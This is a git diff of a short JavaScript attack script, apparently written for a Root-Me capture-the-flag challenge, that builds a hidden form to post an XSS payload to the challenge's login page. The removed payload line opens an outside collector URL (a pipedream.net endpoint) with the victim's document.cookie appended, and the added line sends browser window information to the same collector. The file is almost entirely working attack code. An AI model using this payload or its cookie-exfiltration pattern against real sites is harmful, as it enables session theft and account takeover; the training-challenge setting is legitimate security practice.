@@ -1,7 +1,8 @@
 let url = "http://challenge01.root-me.org:58003/login"
 
+let nullOpener = window.opener == null ? "yes":"non"
 let payload={
-    username :"<script>window.open('https://eozr3kmrbmb1rnm.m.pipedream.net?cookies=' + document.cookie)</script>",
+    username :`<script>window.open("https://eozr3kmrbmb1rnm.m.pipedream.net?openerIsNull="${nullOpener})</script>`,
     secret: "aa",
 }
 const form = document.createElement('form');
@@ -9,8 +10,6 @@ form.method = 'POST';
 form.action = url;
 form.style.visibility = 'hidden'; 
 for (const key of Object.keys(payload)) {
-    console.log(key)
-    console.log(payload)
     var input = document.createElement('input');
     input.name = key;
     input.value = payload[key];
